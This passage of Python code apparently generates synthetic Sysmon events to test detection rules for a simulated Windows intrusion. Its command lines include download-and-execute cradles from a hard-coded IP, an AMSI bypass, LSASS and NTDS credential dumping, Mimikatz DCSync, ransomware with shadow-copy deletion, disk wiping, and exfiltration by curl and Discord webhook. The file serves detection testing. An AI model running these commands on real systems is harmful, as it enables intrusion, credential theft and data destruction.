                         TargetObject=r"HKLM\System\CurrentControlSet\Control\SESSION MANAGER\Environment\__PSLockdownPolicy"))

    ev.append(proc(step(1), G["netsh"], G["ops"], r"C:\Windows\System32\netsh.exe",
                    "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 "
                    "connectport=3389 connectaddress=10.10.10.5",
                    pid=4810, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\netsh.exe", ProcessGuid=G["netsh"],
                         TargetObject=r"HKLM\System\CurrentControlSet\services\PortProxy\v4tov4\tcp\0.0.0.0/8080",
                         Details="10.10.10.5/3389"))

    # === LOLBAS / additional execution vectors ===
    ev.append(proc(step(1), G["cmstp"], G["ops"], r"C:\Windows\System32\cmstp.exe",
                    r'"C:\Windows\System32\cmstp.exe" /au C:\Users\redteam.ops\AppData\Local\Temp\evil.inf',
                    pid=4820, ppid=4510))

    ev.append(proc(step(1), G["regsvr32"], G["ops"], r"C:\Windows\System32\regsvr32.exe",
                    "regsvr32.exe /s /u /i:http://45.132.192.68/evil.sct scrobj.dll",
                    pid=4830, ppid=4510))
    ev.append(raw_event(3, step(0), Image=r"C:\Windows\System32\regsvr32.exe", ProcessGuid=G["regsvr32"],
                         DestinationIp="45.132.192.68", DestinationPort="80",
                         DestinationHostname="45.132.192.68"))

    ev.append(proc(step(1), G["certutil_dl"], G["ops"], r"C:\Windows\System32\certutil.exe",
                    "certutil.exe -urlcache -split -f http://45.132.192.68/stage3.exe "
                    r"C:\Users\redteam.ops\AppData\Local\Temp\stage3.exe",
                    pid=4840, ppid=4510))
    ev.append(raw_event(3, step(0), Image=r"C:\Windows\System32\certutil.exe", ProcessGuid=G["certutil_dl"],
                         DestinationIp="45.132.192.68", DestinationPort="80",
                         DestinationHostname="45.132.192.68"))

    ev.append(proc(step(1), G["certutil_dec"], G["ops"], r"C:\Windows\System32\certutil.exe",
                    r"certutil.exe -decode payload.b64 payload.exe", pid=4850, ppid=4510))

    ev.append(proc(step(1), G["bits"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"Start-BitsTransfer -Source http://45.132.192.68/stage4.exe "
                    r"-Destination C:\Users\redteam.ops\AppData\Local\Temp\stage4.exe",
                    pid=4860, ppid=4510))

    ev.append(proc(step(1), G["cpl"], G["ops"], r"C:\Windows\System32\control.exe",
                    r"control.exe C:\Users\redteam.ops\Downloads\Invoice.cpl", pid=4870, ppid=4510))

    # === Three rundll32 children ===
    # 1) Bare rundll32: injected C2, named pipe, beacon loop, injection into explorer
    ev.append(proc(step(1), G["rundll_bare"], G["ops"], r"C:\Windows\System32\rundll32.exe",
                    "rundll32.exe", pid=4880, ppid=4510))
    ev.append(raw_event(17, step(1), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], PipeName=r"\msagent_7e"))
    ev.append(raw_event(18, step(0), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], PipeName=r"\msagent_7e"))
    ev.append(raw_event(8, step(1), SourceImage=r"C:\Windows\System32\rundll32.exe",
                         SourceProcessGUID=G["rundll_bare"], TargetImage=r"C:\Windows\explorer.exe",
                         TargetProcessGuid=G["root"], NewThreadId="9412"))
    ev.append(raw_event(22, step(1), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], QueryName="cdn-edge-7.telemetry-sync.net",
                         QueryResults="45.132.192.68"))
    random.seed(4242)
    clock = step(2)
    for _ in range(8):
        ev.append(raw_event(3, clock, Image=r"C:\Windows\System32\rundll32.exe",
                             ProcessGuid=G["rundll_bare"], DestinationIp="45.132.192.68",
                             DestinationPort="4444", DestinationHostname="cdn-edge-7.telemetry-sync.net"))
        clock = step(40 * (1 - random.uniform(0, 0.3)))

    # 2) comsvcs.dll MiniDump against LSASS
    ev.append(proc(step(1), G["rundll_dump"], G["ops"], r"C:\Windows\System32\rundll32.exe",
                    r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 668 "
                    r"C:\Windows\Temp\lsass2.dmp full",
                    pid=4900, ppid=4510, integrity="High"))
    ev.append(raw_event(10, step(1), SourceImage=r"C:\Windows\System32\rundll32.exe",
                         SourceProcessGUID=G["rundll_dump"], TargetImage=r"C:\Windows\System32\lsass.exe",
                         GrantedAccess="0x1410", User=USER))

    # 3) url.dll,OpenURL -> spawns wscript.exe
    ev.append(proc(step(1), G["rundll_url"], G["ops"], r"C:\Windows\System32\rundll32.exe",
                    r"rundll32.exe url.dll,OpenURL file://C:/Users/redteam.ops/Downloads/stage5.hta",
                    pid=4910, ppid=4510))
    ev.append(proc(step(1), G["wscript_child"], G["rundll_url"], r"C:\Windows\System32\wscript.exe",
                    r"wscript.exe C:\Users\redteam.ops\Downloads\stage5.js", pid=4920, ppid=4910))

    # === Masquerading, dropped payload, BYOVD, unmanaged PowerShell, startup persistence ===
    ev.append(proc(step(1), G["svchost_masq"], G["ops"], r"C:\Users\Public\svchost.exe",
                    "svchost.exe -k netsvcs", pid=4930, ppid=4510))

    # PE metadata masquerade: internally stamped CALC.EXE, staged in Temp.
    ev.append(proc(step(1), G["calc_masq"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\Dyxxur4gx.exe",
                    r'"Dyxxur4gx.exe"', pid=4935, ppid=4510,
                    OriginalFileName="CALC.EXE", Description="Windows Calculator",
                    Company="Microsoft Corporation"))

    ev.append(proc(step(1), G["payload"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                    r"update.exe -install", pid=4940, ppid=4510, integrity="High"))
    ev.append(raw_event(6, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"], ImageLoaded=r"C:\Windows\Temp\rtcore64.sys",
                         Signed="false", Signature="(Unsigned)"))
    ev.append(raw_event(7, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         ImageLoaded=r"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation"
                         r"\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll"))
    ev.append(raw_event(11, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Roaming\Microsoft\Windows\Start Menu"
                         r"\Programs\Startup\update.lnk"))
    ev.append(raw_event(23, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe.tmp"))

    # === WMI event-consumer persistence ===
    ev.append(proc(step(1), G["wmic"], G["ops"], r"C:\Windows\System32\wbem\WMIC.exe",
                    r'"C:\Windows\System32\wbem\WMIC.exe" /namespace:"\\root\subscription" '
                    r'PATH CommandLineEventConsumer CREATE Name="WinUpdater", '
                    r'ExecutablePath="cmd.exe", CommandLineTemplate="cmd.exe /c calc.exe"',
                    pid=4950, ppid=4510))
    ev.append(raw_event(19, step(1), ProcessGuid=G["wmic"], EventType="WmiFilterEvent",
                         Operation="Created", User=USER, EventNamespace=r"root\cimv2",
                         Name="WinUpdaterFilter"))
    ev.append(raw_event(20, step(1), ProcessGuid=G["wmic"], EventType="WmiConsumerEvent",
                         Operation="Created", User=USER, Name="WinUpdater",
                         Type="Command Line", Destination="cmd.exe /c calc.exe"))
    ev.append(raw_event(21, step(1), ProcessGuid=G["wmic"], EventType="WmiBindingEvent",
                         Operation="Created", User=USER,
                         Consumer='CommandLineEventConsumer.Name="WinUpdater"',
                         Filter='__EventFilter.Name="WinUpdaterFilter"'))

    # === Ransomware finale, off "ops" ===
    ev.append(proc(step(2), G["ransom"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                    "ransom.exe --encrypt", pid=4960, ppid=4510, integrity="High"))
    ev.append(proc(step(1), "{rng-vssadmin}", G["ransom"], r"C:\Windows\System32\vssadmin.exe",
                    "vssadmin.exe delete shadows /all /quiet", pid=4970, ppid=4960, integrity="High"))
    ev.append(raw_event(11, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                         ProcessGuid=G["ransom"],
                         TargetFilename=r"C:\Users\redteam.ops\Desktop\HOW_TO_DECRYPT_FILES.txt"))
    for name in ("Finance_Q3.xlsx", "Board_Minutes.docx", "Customer_List.csv"):
        ev.append(raw_event(11, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                             ProcessGuid=G["ransom"],
                             TargetFilename=rf"C:\Users\redteam.ops\Documents\{name}.locked"))
    ev.append(raw_event(23, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                         ProcessGuid=G["ransom"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Microsoft\Windows\Backup\catalog.wbcat"))

    # === Coverage-expansion pass: SYS-093 through SYS-107, off "ops" ===
    ev.append(proc(step(1), G["schtasks"], G["ops"], r"C:\Windows\System32\schtasks.exe",
                    r"schtasks /create /tn WinUpdaterTask /tr "
                    r"C:\Users\redteam.ops\AppData\Roaming\sync2.exe /sc onlogon /ru SYSTEM",
                    pid=5100, ppid=4510))

    ev.append(proc(step(1), G["svc_installer"], G["ops"], r"C:\Windows\System32\sc.exe",
                    r"sc.exe create WinUpdSvc binPath= "
                    r"C:\Users\redteam.ops\AppData\Local\Temp\svc.exe start= auto",
                    pid=5110, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\sc.exe", ProcessGuid=G["svc_installer"],
                         TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Services\WinUpdSvc\ImagePath",
                         Details=r"C:\Users\redteam.ops\AppData\Local\Temp\svc.exe"))

    # Same payload.exe that loaded the BYOVD driver also reaches into LSASS
    # via a remote thread rather than a memory read.
    ev.append(raw_event(8, step(1), SourceImage=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         SourceProcessGUID=G["payload"], TargetImage=r"C:\Windows\System32\lsass.exe",
                         TargetProcessGuid=G["lsass"], NewThreadId="9512"))

    ev.append(proc(step(1), G["netsh_fw"], G["ops"], r"C:\Windows\System32\netsh.exe",
                    "netsh advfirewall firewall add rule name=WinUpdSvc dir=in action=allow "
                    "protocol=TCP localport=4444", pid=5120, ppid=4510))

    ev.append(proc(step(1), G["wevtutil"], G["ops"], r"C:\Windows\System32\wevtutil.exe",
                    "wevtutil cl Security", pid=5130, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["rar_archive"], G["ops"], r"C:\Program Files\WinRAR\rar.exe",
                    r"rar.exe a -pS3cr3t99 C:\Users\redteam.ops\AppData\Local\Temp\exfil.rar "
                    r"C:\Users\redteam.ops\Documents", pid=5140, ppid=4510))

    ev.append(proc(step(1), G["installutil"], G["ops"],
                    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe",
                    r"InstallUtil.exe C:\Users\redteam.ops\AppData\Local\Temp\stage6.dll",
                    pid=5150, ppid=4510))

    ev.append(proc(step(1), G["mshta_remote"], G["ops"], r"C:\Windows\System32\mshta.exe",
                    "mshta.exe http://45.132.192.68/second.hta", pid=5160, ppid=4510))

    ev.append(proc(step(1), G["hh_help"], G["ops"], r"C:\Windows\hh.exe",
                    r"hh.exe C:\Users\redteam.ops\AppData\Local\Temp\help.chm",
                    pid=5170, ppid=4510))

    ev.append(proc(step(1), G["msiexec_remote"], G["ops"], r"C:\Windows\System32\msiexec.exe",
                    "msiexec.exe /i http://45.132.192.68/pkg.msi /qn", pid=5180, ppid=4510))

    ev.append(proc(step(1), G["net_admin"], G["ops"], r"C:\Windows\System32\net.exe",
                    "net.exe localgroup administrators redteam.ops /add", pid=5190, ppid=4510))

    ev.append(proc(step(1), G["sc_stop"], G["ops"], r"C:\Windows\System32\sc.exe",
                    "sc.exe stop WinDefend", pid=5200, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["sdelete"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\sdelete64.exe",
                    r"sdelete64.exe -p 3 -z C:", pid=5210, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["cipher_wipe"], G["ops"], r"C:\Windows\System32\cipher.exe",
                    r"cipher.exe /w:C:\Users\redteam.ops\AppData\Local\Temp",
                    pid=5220, ppid=4510))

    ev.append(proc(step(1), G["reg_rdp"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" "
                    r"/v fDenyTSConnections /t REG_DWORD /d 0 /f",
                    pid=5230, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_rdp"],
                         TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections",
                         Details="DWORD (0x00000000)"))

    # === Coverage-expansion pass 2: SYS-108 through SYS-123, off "ops" ===
    ev.append(proc(step(1), G["reg_hive_dump"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg.exe save HKLM\SAM C:\Users\redteam.ops\AppData\Local\Temp\sam.hive",
                    pid=5240, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["procdump"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\procdump64.exe",
                    r"procdump64.exe -ma lsass.exe C:\Users\redteam.ops\AppData\Local\Temp\lsass3.dmp",
                    pid=5250, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["ntdsutil"], G["ops"], r"C:\Windows\System32\ntdsutil.exe",
                    r'ntdsutil.exe "ac i ntds" "ifm" "create full C:\Users\redteam.ops\AppData\Local\Temp\ntds" q q',
                    pid=5260, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["mavinject"], G["ops"], r"C:\Windows\System32\mavinject.exe",
                    r"mavinject.exe 4930 /INJECTRUNNING C:\Users\redteam.ops\AppData\Local\Temp\evil.dll",
                    pid=5270, ppid=4510))

    ev.append(proc(step(1), G["wsl"], G["ops"], r"C:\Windows\System32\wsl.exe",
                    r'wsl.exe -e /bin/bash -c "curl http://45.132.192.68/stage7.sh | bash"',
                    pid=5280, ppid=4510))

    ev.append(proc(step(1), G["msbuild"], G["ops"],
                    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
                    r"MSBuild.exe C:\Users\redteam.ops\AppData\Local\Temp\evil.csproj",
                    pid=5290, ppid=4510))

    ev.append(proc(step(1), G["forfiles"], G["ops"], r"C:\Windows\System32\forfiles.exe",
                    r"forfiles.exe /p C:\Users\redteam.ops\AppData\Local\Temp /m stage8.exe /c stage8.exe",
                    pid=5300, ppid=4510))

    ev.append(proc(step(1), G["tscon"], G["ops"], r"C:\Windows\System32\tscon.exe",
                    "tscon.exe 3 /dest:rdp-tcp#1", pid=5310, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["sharphound"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\SharpHound.exe",
                    "SharpHound.exe -c All --zipfilename loot.zip", pid=5320, ppid=4510))

    ev.append(proc(step(1), G["rclone"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\rclone.exe",
                    r"rclone.exe copy C:\Users\redteam.ops\Documents remote:backup --config C:\Users\redteam.ops\AppData\Local\Temp\rclone.conf",
                    pid=5330, ppid=4510))

    ev.append(proc(step(1), G["rubeus"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\Rubeus.exe",
                    "Rubeus.exe kerberoast /outfile:C:\\Users\\redteam.ops\\AppData\\Local\\Temp\\hashes.txt",
                    pid=5340, ppid=4510))

    ev.append(proc(step(1), G["ps_downgrade"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -version 2 -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
                    r"DownloadString('http://45.132.192.68/legacy.ps1')\"",
                    pid=5350, ppid=4510))

    ev.append(proc(step(1), G["ps_amsi"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -c \"[Ref].Assembly.GetType("
                    r"'System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',"
                    r"'NonPublic,Static').SetValue($null,$true)\"",
                    pid=5360, ppid=4510))

    ev.append(proc(step(1), G["bitsadmin"], G["ops"], r"C:\Windows\System32\bitsadmin.exe",
                    r"bitsadmin.exe /transfer myjob http://45.132.192.68/stage9.exe "
                    r"C:\Users\redteam.ops\AppData\Local\Temp\stage9.exe",
                    pid=5370, ppid=4510))

    ev.append(proc(step(1), G["com_hijack"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"New-Item -Path "
                    r"'HKCU:\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32' "
                    r"-Force; Set-ItemProperty -Path "
                    r"'HKCU:\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32' "
                    r"-Name '(default)' -Value 'C:\Users\redteam.ops\AppData\Local\Temp\evil.dll'\"",
                    pid=5380, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["com_hijack"],
                         TargetObject=r"HKU\S-1-5-21-1-2-3-1001\Software\Classes\CLSID"
                         r"\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32\(Default)",
                         Details=r"C:\Users\redteam.ops\AppData\Local\Temp\evil.dll"))

    ev.append(proc(step(1), G["juicypotato"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\JuicyPotato.exe",
                    "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t *",
                    pid=5390, ppid=4510, integrity="High"))

    # === Coverage-expansion pass 3: SYS-124 through SYS-131, off "ops" ===
    # DNS query to a dynamic-DNS domain, reusing the beacon already running
    # under rundll_bare rather than spinning up a new actor.
    ev.append(raw_event(22, step(1), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], QueryName="failover.duckdns.org",
                         QueryResults="45.132.192.68"))

    # Self-cleanup: the BYOVD payload deletes its own staged copy after running.
    ev.append(raw_event(23, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"], IsExecutable="true",
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe"))

    # Process tampering: a masquerading svchost gets hollowed out for the
    # actual payload to run inside.
    ev.append(proc(step(1), G["hollow_host"], G["ops"], r"C:\Windows\System32\svchost.exe",
                    "svchost.exe -k netsvcs -p", pid=5400, ppid=4510))
    ev.append(raw_event(25, step(1), Image=r"C:\Windows\System32\svchost.exe",
                         ProcessGuid=G["hollow_host"], Type="Image is locked for access"))

    # Executable payload staged inside an NTFS alternate data stream on an
    # otherwise ordinary-looking staged document.
    ev.append(raw_event(15, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         TargetFilename=r"C:\Users\redteam.ops\Downloads\Invoice_Q3.pdf:payload.exe"))

    # Raw volume read: a RawCopy-style tool bypasses the file API entirely to
    # read a locked hive/DB off disk sector by sector.
    ev.append(proc(step(1), G["rawcopy"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\RawCopy.exe",
                    r"RawCopy.exe /FileNamePath:C:\Windows\NTDS\ntds.dit /OutputPath:C:\Users\redteam.ops\AppData\Local\Temp",
                    pid=5410, ppid=4510, integrity="High"))
    ev.append(raw_event(9, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\RawCopy.exe",
                         ProcessGuid=G["rawcopy"], Device=r"\Device\HarddiskVolume2"))

    # Timestomping: a dropped DLL's creation time is backdated to blend in
    # with the surrounding system files.
    ev.append(proc(step(1), G["timestomp"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\timestomp.exe",
                    r"timestomp.exe C:\Windows\System32\evil.dll -z C:\Windows\System32\ntdll.dll",
                    pid=5420, ppid=4510))
    ev.append(raw_event(2, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\timestomp.exe",
                         ProcessGuid=G["timestomp"], TargetFilename=r"C:\Windows\System32\evil.dll",
                         CreationUtcTime="2019-03-19 10:12:00.000",
                         PreviousCreationUtcTime="2026-07-15 09:41:03.000"))

    # DCSync: replication rights abused to pull every credential in the
    # domain over DRSUAPI, no LSASS access and no NTDS.dit file read at all.
    ev.append(proc(step(1), G["dcsync"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\mimikatz.exe",
                    r'mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"',
                    pid=5430, ppid=4510, integrity="High"))

    # A second Mimikatz invocation, this time via the sekurlsa module -- an
    # independent, command-line-only signal alongside the LSASS-access rules.
    ev.append(proc(step(1), G["mimikatz_sekurlsa"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\mimikatz.exe",
                    r'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
                    pid=5440, ppid=4510, integrity="High"))

    # === Coverage-expansion pass 4: SYS-132 through SYS-150, off "ops" ===
    # SYS-143 (rclone remote), SYS-138 (netsh interface) and SYS-149 (net
    # group / nltest) are not repeated here -- G["rclone"], G["netsh"], and
    # G["net"]/G["nltest"] above already emit command lines that satisfy
    # them, discovered when this pass was designed rather than duplicated.
    ev.append(proc(step(1), G["odbcconf"], G["ops"], r"C:\Windows\System32\odbcconf.exe",
                    r'odbcconf.exe /A {REGSVR "evil.dll"}', pid=5450, ppid=4510))

    ev.append(proc(step(1), G["mmc_console"], G["ops"], r"C:\Windows\System32\mmc.exe",
                    r"mmc.exe C:\Users\redteam.ops\AppData\Local\Temp\evil.msc",
                    pid=5460, ppid=4510))

    # A non-browser process stages Chrome's credential store into Temp --
    # one event, but it satisfies both the process-identity rule (SYS-135)
    # and the staging-path rule (SYS-137) at once, by design.
    ev.append(proc(step(1), G["cred_stager"], G["ops"], r"C:\Windows\System32\cmd.exe",
                    r'cmd.exe /c copy "C:\Users\redteam.ops\AppData\Local\Google\Chrome\User Data'
                    r'\Default\Login Data" "C:\Users\redteam.ops\AppData\Local\Temp\Login Data"',
                    pid=5470, ppid=4510))
    ev.append(raw_event(11, step(1), Image=r"C:\Windows\System32\cmd.exe",
                         ProcessGuid=G["cred_stager"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\Login Data"))

    ev.append(proc(step(1), G["keepass_touch"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"Copy-Item 'C:\Users\redteam.ops\Documents\vault.kdbx' "
                    r"'C:\Users\redteam.ops\AppData\Local\Temp\vault.kdbx'\"",
                    pid=5480, ppid=4510))
    ev.append(raw_event(11, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["keepass_touch"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\vault.kdbx"))

    ev.append(proc(step(1), G["netstat_enum"], G["ops"], r"C:\Windows\System32\netstat.exe",
                    "netstat.exe -ano", pid=5490, ppid=4510))

    ev.append(proc(step(1), G["dir_recurse"], G["ops"], r"C:\Windows\System32\cmd.exe",
                    r"cmd.exe /c dir /s C:\Users\redteam.ops\Documents",
                    pid=5500, ppid=4510))

    ev.append(proc(step(1), G["av_discovery"], G["ops"], r"C:\Windows\System32\cmd.exe",
                    r'cmd.exe /c tasklist | findstr /i "sentinelone defender"',
                    pid=5510, ppid=4510))

    ev.append(proc(step(1), G["archive_mhe"], G["ops"], r"C:\Program Files\7-Zip\7z.exe",
                    r"7z.exe a -mhe -pS3cr3t99 C:\Users\redteam.ops\AppData\Local\Temp\exfil2.7z "
                    r"C:\Users\redteam.ops\Documents",
                    pid=5520, ppid=4510))

    ev.append(proc(step(1), G["curl_upload"], G["ops"], r"C:\Windows\System32\curl.exe",
                    r"curl.exe -T C:\Users\redteam.ops\AppData\Local\Temp\exfil2.7z "
                    r"https://45.132.192.68/upload",
                    pid=5530, ppid=4510))

    ev.append(proc(step(1), G["sharphound_ps1"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
                    r"DownloadString('http://45.132.192.68/SharpHound.ps1'); "
                    r"Invoke-BloodHound -CollectionMethod All\"",
                    pid=5540, ppid=4510))

    ev.append(proc(step(1), G["asrep_roast"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\GetNPUsers.py",
                    r"GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -no-pass",
                    pid=5550, ppid=4510, integrity="High"))

    # === Coverage-expansion pass 5: ClickFix/FileFix, direct children of ===
    # === explorer.exe -- the whole point of the technique is that a user  ===
    # === pastes into the Run dialog, so explorer.exe is the real parent   ===
    # === here rather than "ops" like every other LOLBAS branch above.     ===
    #
    # Decoy CAPTCHA-verification lure, padded with a `#` comment to push the
    # real command off-screen (SYS-151), which also happens to satisfy the
    # generic download-idiom rule (SYS-153) since it carries `iwr | iex`.
    ev.append(proc(step(1), G["clickfix_lure"], G["root"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -w hidden -c "iwr http://45.132.192.68/x.ps1|iex"'
                    r"      # Verification ID: 8823-KLM - I am not a robot, please wait...",
                    pid=5560, ppid=3120))

    # Execution-policy bypass stacked with a hidden window, launched straight
    # from Explorer (SYS-152) -- also a download cradle (SYS-153).
    ev.append(proc(step(1), G["clickfix_bypass"], G["root"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell.exe -ep bypass -w hidden -c IEX(New-Object "
                    r"Net.WebClient).DownloadString('http://45.132.192.68/stage2.ps1')",
                    pid=5570, ppid=3120))

    # mshta named directly in the Run dialog rather than typed by an admin
    # (SYS-153) -- independently also satisfies SYS-100's URL check.
    ev.append(proc(step(1), G["clickfix_mshta"], G["root"], r"C:\Windows\System32\mshta.exe",
                    "mshta.exe http://45.132.192.68/payload.hta", pid=5580, ppid=3120))

    # Second-stage PowerShell pulling the real payload back out of the
    # clipboard rather than the Run-dialog command carrying it directly
    # (SYS-154) -- parented at the bypass process above, not Explorer, since
    # that is exactly the point the rule's own description makes: by this
    # stage the parent is no longer Explorer.
    ev.append(proc(step(1), G["clickfix_clip"], G["clickfix_bypass"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -nop -c "iex (Get-Clipboard | Out-String)"',
                    pid=5590, ppid=5570))

    # === Coverage-expansion pass 6: RMM abuse + collection gaps, off "ops" ===
    # A remote-access tool dropped and silently installed by the dispatcher
    # rather than double-clicked by a user -- satisfies both the
    # non-Explorer-parent rule (SYS-155) and the silent-install rule
    # (SYS-156) from a single install command.
    ev.append(proc(step(1), G["rmm_tool"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\AnyDesk.exe",
                    "AnyDesk.exe --install --silent --start-with-win",
                    pid=5600, ppid=4510))

    # A clipboard-hijack ("crypto-clipper") pattern: read what the victim
    # last copied, then overwrite it before they paste (SYS-157).
    ev.append(proc(step(1), G["clip_hijack"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -c "$c=Get-Clipboard; Set-Clipboard -Value '
                    r'\'bc1qattackerwallet\'; Invoke-WebRequest -Uri '
                    r'http://45.132.192.68/clip -Body $c"',
                    pid=5610, ppid=4510))

    # Problem Steps Recorder abused for silent screenshot collection
    # (SYS-158).
    ev.append(proc(step(1), G["psr_capture"], G["ops"], r"C:\Windows\System32\psr.exe",
                    r"psr.exe /start /gui 0 /output C:\Users\redteam.ops\AppData\Local"
                    r"\Temp\out.zip",
                    pid=5620, ppid=4510))

    # === Coverage-expansion pass 7: web-service C2 + data staging, off "ops" ===
    # A Discord webhook used as a covert exfil channel, no attacker
    # infrastructure required (SYS-159).
    ev.append(proc(step(1), G["webhook_c2"], G["ops"], r"C:\Windows\System32\curl.exe",
                    r'curl.exe -X POST -F "file=@C:\Users\redteam.ops\AppData\Local'
                    r'\Temp\exfil2.7z" https://discord.com/api/webhooks/135792468'
                    r'/AbCdEfGhIjKlMnOpQrSt',
                    pid=5630, ppid=4510))

    # A pastebin raw dead-drop fetched straight into memory (SYS-160).
    ev.append(proc(step(1), G["paste_dropoff"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -nop -c "IEX (New-Object Net.WebClient).'
                    r"DownloadString('https://pastebin.com/raw/9Kx4mPqL')\"",
                    pid=5640, ppid=4510))

    # A broad user-data directory archived ahead of exfil (SYS-161).
    ev.append(proc(step(1), G["archive_staging"], G["ops"], r"C:\Program Files\7-Zip\7z.exe",
                    r"7z.exe a C:\Windows\Temp\stage3.7z C:\Users\redteam.ops\Documents",
                    pid=5650, ppid=4510))

    # robocopy mass-mirrors a Desktop tree out to a remote share (SYS-162).
    ev.append(proc(step(1), G["robocopy_staging"], G["ops"],
                    r"C:\Windows\System32\robocopy.exe",
                    r"robocopy.exe C:\Users\redteam.ops\Desktop "
                    r"\\45.132.192.68\share\loot /MIR",
                    pid=5660, ppid=4510))

    # === Coverage-expansion pass 8: AD-specific gaps, off "ops" ===
    # Rubeus used to pass a stolen ticket rather than to Kerberoast --
    # deliberately also satisfies SYS-118's generic rubeus.exe catch-all
    # (SYS-163).
